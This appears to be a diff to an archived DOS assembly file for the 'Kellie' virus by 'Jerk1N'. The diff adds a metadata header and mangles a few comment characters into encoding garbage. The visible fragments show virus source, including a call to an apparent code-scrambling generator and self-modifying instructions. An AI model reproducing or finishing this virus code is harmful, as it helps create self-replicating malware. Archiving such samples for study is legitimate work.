@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      K
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;############################################################################
 ;# Virus Name: Kellie                          # Size: 404 Bytes            #
 ;# Author: Jerk1N                              # EMail: jerk1n@trust-me.com #
@@ -27,10 +38,10 @@ getdo:	pop	di
 
 p:      mov     dx,01h                          ;Don't Scramble AFTER Gen.
         mov     cx,S                            ;Set Length           /^\
-        lea     ax,[bp+offset jak]              ;Point to START        Ý
-        call    JVS                             ;Generate             /Ý\
-                                                                       Ý
-jak:                                            ;                     /Ý\
+        lea     ax,[bp+offset jak]              ;Point to START        ï¿½
+        call    JVS                             ;Generate             /ï¿½\
+                                                                       ï¿½
+jak:                                            ;                     /ï¿½\
         mov     word ptr [bp+offset p+1h],00h   ;  p:   mov  dx,00h  --/
 	mov	di,100h
 	lea	si,[bp+offset orig]
